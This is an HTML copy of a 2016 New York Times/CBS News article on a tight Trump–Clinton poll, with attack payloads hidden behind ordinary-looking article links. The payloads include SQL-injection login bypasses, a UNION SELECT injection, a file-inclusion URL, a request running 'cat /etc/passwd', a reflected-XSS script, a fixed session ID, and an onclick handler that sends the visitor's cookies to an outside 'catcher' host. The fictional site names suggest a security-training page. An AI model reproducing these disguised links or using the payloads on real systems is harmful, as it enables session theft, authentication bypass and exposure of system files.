<h2>Poll Shows Tight Race for Donald Trump and Hillary Clinton</h2>

<p class="details">By GIOVANNI RUSSONELLO SEPT.15, 2016 <a href="#"></a> </p>

<p>
With less than <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
271&submit=Login" target="_blank">eight weeks </a> before Election Day, Donald J. Trump and Hillary Clinton are locked in a tight contest, with both candidates still struggling to win the confidence of their <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">respective bases,</a> the latest New York Times/CBS News poll finds.
</p> 

<p><img class="alignright" src="/images/trumpclinton.png " width="350" height="350" alt="trumpclinton" /></p>

<p>
Mrs. Clinton, the Democratic nominee, has the support of <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">46 percent of likely voters nationwide,</a> to 44 percent for Mr. Trump, the Republican, including those who said they were leaning toward a candidate. Looking more broadly at all registered voters, Mrs. Clinton holds a wider edge, <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> 46 to 41 percent.</a>
</p> <p>
In a four-way race, Mr. Trump and Mrs. Clinton are tied at 42 percent each. Gary Johnson, the Libertarian candidate, has the support of 8 percent of likely voters, and the Green Party nominee, <a href="http://www.theplanetreports.com/uploads/traversal_main.php?data=cat%20/etc/passwd" target="_blank" >Jill Stein, takes 4 percent.</a>
</p> <p>
The third-party candidates draw their strongest support from younger voters. Twenty-six percent of voters ages 18 to 29 say they plan to vote for Mr. Johnson, and another 10 percent back Ms. Stein. A little more than one in <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">five political independents </a> say they will vote for one of the third-party candidates.
</p> <p>
Discontent with the major party candidates is widespread. Among those who say they intend to vote for Mr. Trump or Mrs. Clinton, slightly more than half express strong support. The rest say that they <a href="http://www.theplanetreports.com/index.php?name=Visitor%3Cscript%3Ealert(%27You%20are%20being%20attacked.%27)%3C/script%3E" target="_blank"> harbor reservations about their candidate,</a> or that they are simply voting to thwart the other nominee.
</p> <p>
Over all, just 43 percent of likely voters describe themselves as very enthusiastic about casting a ballot in November. Fifty-one percent of Mr. Trump’s supporters say they are very enthusiastic about voting; <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">43 percent of Mrs. Clinton’s </a> supporters say they are very enthusiastic.
</p> <p>
The race has clearly grown tighter in recent weeks. National polling averages show that Mrs. Clinton’s margin over Mr. Trump has narrowed from eight points in early August to two points today.
</p> <p>
Mrs. Clinton found herself under attack last week for suggesting that half of Mr. Trump’s supporters held views that made them “deplorables,” and for her campaign’s attempts to conceal her pneumonia diagnosis. <a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank">The Times/CBS News poll </a> was conducted from Sept. 9 to 13, so many of those interviewed were aware of the controversies.
</p> <p>
Mr. Trump hired new campaign leadership in mid-August and has been more disciplined in his public statements. His poll numbers have been steadily rising.
</p> <p>
Mrs. Clinton continues to outpace Mr. Trump among women, nonwhites and younger voters, while Mr. Trump leads among whites, 57 to 33 percent.
</p> <p>
Among white women, the candidates are virtually tied: <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank"> 46 percent for Mrs. Clinton and 45 percent for Mr. Trump.</a>
</p> <p>
Mrs. Clinton’s support is notably strong among college graduates, particularly whites. She leads by 11 points among white likely voters with a college degree; if polling holds, she would be the first Democrat in <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">60 years to win among this group.</a>
</p> <p>
This is the first Times/CBS News poll of the election cycle to include a measure of likely voters. The nationwide telephone survey reached 1,433 registered voters and has a margin of sampling error of plus or minus three percentage points. To achieve a sample that reflected the probable electorate, these voters were weighted by their responses to questions about voting history, attention to the campaign and likelihood of voting.
</p> <p>
With Mrs. Clinton sidelined by illness this week, Mr. Trump has vigorously pressed his case. He promoted a new plan to support working parents on Tuesday, and released a partial account of his medical status on Wednesday during a taping of “The Dr. Oz Show.”
</p> <p>
Poll participants expressed ambivalence about the need for more information on the candidates’ medical histories. For each candidate, just 45 percent of registered voters said they wanted to see more medical records released. (Questions about Mr. Trump’s and Mrs. Clinton’s medical records were asked starting on Sunday afternoon, after news broke that Mrs. Clinton fell ill at a ceremony commemorating the Sept. 11, 2001, attacks.)
</p> <p>
Mr. Johnson’s showing of 8 percent support in this poll will make it difficult for him to qualify for the first presidential debate, on Sept. 26. Under the rules set by the Commission on Presidential Debates, a candidate must reach an average of 15 percent support in five major news media polls, including the Times/CBS News poll. Another poll included in the average used by the commission, the Washington Post/ABC News poll, had Mr. Johnson at 9 percent support last week.
</p>


